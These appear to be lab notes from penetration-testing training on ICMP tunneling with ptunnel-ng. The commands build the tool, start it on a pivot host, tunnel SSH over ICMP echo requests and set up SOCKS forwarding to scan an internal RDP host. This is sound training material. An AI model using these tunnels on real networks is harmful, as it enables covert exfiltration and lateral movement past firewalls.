
- Uses ICMP echo requests to exfiltrate data
- Won't work when firewalls block echo requests

Attack host:
```shell-session
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
```
```shell-session
sudo ./autogen.sh 
```

**OR

```shell-session
sudo apt install automake autoconf -y

cd ptunnel-ng/

sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh

./autogen.sh
```

```shell-session
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

Pivot Host:
```shell-session
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

Attack host:
```shell-session
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

**Tunneling SSH through an ICMP tunnel (attack host)
```shell-session
ssh -p2222 -lubuntu 127.0.0.1
```

**Enabling Dynamic Port Forwarding over SSH
```shell-session
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
```shell-session
proxychains nmap -sV -sT 172.16.5.19 -p3389
```


